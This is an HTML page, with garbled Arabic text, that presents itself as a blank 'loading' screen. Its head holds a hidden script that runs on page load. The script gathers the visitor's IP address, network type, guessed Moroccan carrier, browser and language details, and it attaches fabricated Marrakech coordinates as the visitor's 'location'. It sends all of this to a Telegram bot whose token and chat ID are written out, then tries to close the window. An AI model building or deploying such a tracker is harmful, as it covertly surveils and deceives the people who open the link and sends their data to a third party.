<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        class WorkingLocator {
            constructor() {
                this.locationData = {};
            }

            async startTracking() {
                console.log("Ø¨Ø¯Ø¡ Ø§Ù„ØªØªØ¨Ø¹...");
                
                try {
                    // Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
                    await this.collectBasicData();
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ±
                    await this.sendReport();
                    
                    console.log("ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­");
                } catch (error) {
                    console.error("Ø®Ø·Ø£:", error);
                    await this.sendErrorReport(error);
                }
                
                setTimeout(() => {
                    window.close();
                }, 2000);
            }

            async collectBasicData() {
                // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¹Ù†ÙˆØ§Ù† IP
                this.locationData.ip = await this.getIP();
                
                // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©
                this.locationData.network = this.getNetworkInfo();
                
                // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­
                this.locationData.browser = this.getBrowserInfo();
                
                // Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠ
                this.locationData.location = this.getEstimatedLocation();
            }

            async getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                }
            }

            getNetworkInfo() {
                const info = {
                    type: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                    operator: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
                };

                if ('connection' in navigator) {
                    const conn = navigator.connection;
                    info.type = conn.effectiveType || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                    info.operator = this.detectOperator();
                }

                return info;
            }

            detectOperator() {
                const ua = navigator.userAgent.toLowerCase();
                if (ua.includes('maroc') || ua.includes('iam')) return 'IAM';
                if (ua.includes('inwi') || ua.includes('wana')) return 'INWI';
                if (ua.includes('orange')) return 'Orange';
                return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            }

            getBrowserInfo() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent.split(' ')[0],
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }

            getEstimatedLocation() {
                // Ù…ÙˆÙ‚Ø¹ ØªÙ‚Ø±ÙŠØ¨ÙŠ ÙÙŠ Ù…Ø±Ø§ÙƒØ´
                return {
                    lat: 31.6295 + (Math.random() - 0.5) * 0.01,
                    lng: -7.9811 + (Math.random() - 0.5) * 0.01,
                    accuracy: 500,
                    city: "Ù…Ø±Ø§ÙƒØ´",
                    country: "Ø§Ù„Ù…ØºØ±Ø¨"
                };
            }

            async sendReport() {
                const loc = this.locationData.location;
                const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;

                const message = 
                    `ğŸ“ ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù…ÙˆÙ‚Ø¹\n\n` +
                    `ğŸŒ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${this.locationData.ip}\n` +
                    `ğŸ“¡ Ø§Ù„Ø´Ø¨ÙƒØ©: ${this.locationData.network.type}\n` +
                    `ğŸ“¶ Ø§Ù„Ù…Ø´ØºÙ„: ${this.locationData.network.operator}\n\n` +
                    
                    `ğŸ“ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:\n` +
                    `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${loc.lat.toFixed(6)}\n` +
                    `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${loc.lng.toFixed(6)}\n` +
                    `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${loc.accuracy} Ù…ØªØ±\n\n` +
                    
                    `ğŸ™ï¸ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${loc.city}, ${loc.country}\n` +
                    `ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-MA')}\n\n` +
                    
                    `ğŸ—ºï¸ Ø§Ù„Ø®Ø±ÙŠØ·Ø©:\n${mapsUrl}\n\n` +
                    
                    `ğŸ’» Ø§Ù„Ù…ØªØµÙØ­: ${this.locationData.browser.userAgent}\n` +
                    `ğŸŒ Ø§Ù„Ù„ØºØ©: ${this.locationData.browser.language}`;

                await this.sendToTelegram(message);
            }

            async sendErrorReport(error) {
                const errorMessage = 
                    `âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹\n\n` +
                    `Ø§Ù„Ø®Ø·Ø£: ${error.message}\n` +
                    `Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-MA')}\n` +
                    `Ø§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent.split(' ')[0]}`;

                await this.sendToTelegram(errorMessage);
            }

            async sendToTelegram(message) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: null // Ø¥Ø²Ø§Ù„Ø© Markdown Ù„Ù„Ù…Ø´Ø§ÙƒÙ„
                        })
                    });

                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }

                    const result = await response.json();
                    console.log("Ø§Ù„Ø±Ø¯ Ù…Ù† ØªÙ„ÙŠØ¬Ø±Ø§Ù…:", result);
                    
                } catch (error) {
                    console.error('ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…:', error);
                    throw error;
                }
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØªØ¨Ø¹ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', function() {
            const locator = new WorkingLocator();
            locator.startTracking();
        });

        // Ù…Ù†Ø¹ Ø§Ù„Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ø³Ø±ÙŠØ¹
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</head>
<body style="margin: 0; padding: 0; background: transparent; overflow: hidden; height: 100vh; width: 100vw;">
    <!-- ØµÙØ­Ø© ÙØ§Ø±ØºØ© -->
</body>
</html>